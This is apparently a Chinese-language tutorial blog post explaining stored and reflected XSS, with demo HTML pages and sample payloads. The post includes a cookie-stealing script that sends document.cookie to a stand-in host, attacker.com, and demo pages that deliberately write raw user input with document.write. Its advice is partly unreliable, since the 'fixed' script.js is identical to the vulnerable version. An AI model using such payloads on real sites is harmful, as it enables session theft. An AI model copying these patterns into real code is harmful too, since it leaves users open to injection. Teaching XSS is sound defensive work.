# 用代码演示XSS攻击：如何注入恶意脚本

## 一. 概述

`XSS攻击`是一种常见的Web安全漏洞，它可以让攻击者在受害者的`浏览器中执行恶意脚本`，从而窃取用户的敏感信息或者进行其他恶意行为。本文主要介绍`XSS`的原理和实现方式，并且通过实例来说明如何防范`XSS`攻击。

## 二. XSS攻击的基本原理

`XSS攻击`是指攻击者通过`执行恶意脚本来攻击Web应用程序`，从而在受害者的`浏览器中执行恶意代码`。XSS攻击可以分为两种类型：`存储型XSS`和`反射型XSS`。

### 1. 存储型XSS

`存储型XSS`是指攻击者`将恶意脚本存储在Web应用程序的数据库中`，当用户访问包含恶意脚本的页面时，恶意脚本会被执行。`存储型XSS攻击`通常发生在`留言板`，`评论区`等需要用户输入内容的地方。

### 2. 反射型XSS

`反射型XSS`是指攻击者`将恶意脚本作为参数发送给Web应用程序`，Web应用程序将恶意脚本反射给用户的浏览器，从而执行恶意代码。`反射型XSS攻击`通常发生在`搜索框`，`登录框`等需要用户输入内容的地方。

## 三. XSS攻击的实现方式

`XSS攻击`可以通过多种方式来实现，包括以下几种：

##### 1. HTML注入

攻击者可以在Web应用程序中注入HTML标签和属性，从而执行恶意代码。例如，攻击者可以在留言板中输入以下内容：

```js
js
复制代码<script>alert('XSS攻击')</script>
```

当用户访问包含这个留言的页面时，就会弹出一个提示框内，从而执行恶意代码。

```html
html复制代码<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS攻击</title>
</head>

<body>
    <h1>Welcome to my website!</h1>
    <p>Enter your name:</p>
    <input type="text" id="name">
    <button onclick="greet()">Greet</button>
    <script>
        //在input输入框中输入<script>alert('XSS攻击')</script>
        function greet() {
            let name = document.getElementById("name").value;
            document.write("<p>Hello, " + name + "!</p>");
        }
    </script>
</body>

</html>
```

运行截图：

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f9948ef7e5774a7ca14bdede68fc8411~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

##### 2. JavaScript注入

攻击者可以在Web应用程序中注入JavaScript代码，从而执行恶意代码。例如：攻击者可以在搜索框中输入以下内容：

```js
js
复制代码<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

当用户在输入框中输入关键字时，就会将用户的Cookie发送给攻击者的服务器，从而窃取用户的敏感信息。

注：[attacker.com/steal.php](https://link.juejin.cn?target=http%3A%2F%2Fattacker.com%2Fsteal.php)。它的名称和URL表明它可能是一个用于窃取用户信息的网站，例如用户名、密码、信用卡信息等。攻击者可能会使用各种技术和手段来欺骗用户，使其在该网站上输入敏感信息，从而实现窃取。因此，用户应该保持警惕，避免在不信任的网站上输入敏感信息，同时使用安全的密码和身份验证方法来保护自己的账户。网站管理员也应该采取措施来保护用户数据，例如使用SSL加密、限制访问、监控异常活动等。

```html
html复制代码<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JavaScript注入</title>
</head>

<body>
    <h1>Welcome to my website!</h1>
    <p>Enter your name:</p>
    <input type="text" id="name">
    <button onclick="greet()">Greet</button>
    <script>
        function greet() {
            let name = document.getElementById("name").value;
            document.write("<p>Hello, " + name + "!</p>");
            let script = document.createElement("script");
            script.innerHTML = "alert('JavaScript注入xss攻击!')";
            document.body.appendChild(script);
        }
    </script>
</body>

</html>
```

运行截图：

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/555d869298be46c494b7b00f54878e5b~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

##### 3. URL注入

攻击者可以在url中注入恶意代码，从而执行恶意代码。例如：攻击者可以构造如下url：

```js
js
复制代码http://example.com/search.php?q=<script>alert('XSS攻击')</script>
```

当用户访问这个url时，就会执行恶意代码，从而进行攻击。

注：[example.com/](https://link.juejin.cn?target=https%3A%2F%2Fexample.com%2F)，它不属于任何实际的组织或公司，也没有任何实际的内容。它的目的是为了提供一个可用的域名，供开发人员和测试人员使用，以测试网站和应用程序的功能和性能。该网站通常用于演示和测试目的，不包含任何敏感信息或个人数据。

```html
html复制代码<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>URL注入XSS攻击</title>
</head>

<body>
    <h1>Welcome to my website!</h1>
    <p>Enter your name:</p>
    <input type="text" id="name">
    <button onclick="greet()">Greet</button>
    <script src="script.js"></script>
</body>

</html>
function greet() {
    let name = document.getElementById("name").value;
    document.write("<p>Hello, " + name + "!</p>");
    let url = "http://example.com/search?q=" + encodeURIComponent("<script>alert('XSS攻击')</script>");
    window.location.href = url;
}
```

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/af9a03ea5b824ee9ba70c1d6bb0c9c46~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?) 为了防止URL注入XSS攻击，应该对URL参数进行过滤和转义，以确保它们不包含任何恶意脚本。在这个例子中，使用了encodeURIComponent()函数来对查询参数进行编码，以确保它们不包含任何特殊字符。同时，应该避免在URL中包含未经过滤的用户输入。

```js
//对上述script.js进行修改
function greet() {
    let name = document.getElementById("name").value;
    document.write("<p>Hello, " + name + "!</p>");
    //使用了encodeURLComponent()函数来对查询参数进行编码
    let url = "http://example.com/search?q=" + encodeURIComponent("<script>alert('XSS攻击')</script>");
    window.location.href = url;
}
```

## 四. 总结

`XSS攻击`是一种常见的Web安全漏洞。它可以让攻击者在受害者的`浏览器中执行恶意脚本`，从而窃取用户的敏感信息或者进行其他恶意行为。为了防止XSS攻击，我们可以在`服务器端对用户输入的内容进行过滤和转义`，从而防止恶意脚本的注入。在实际开发中，我们需要注意XSS攻击的规范，以保障Web应用程序的安全性。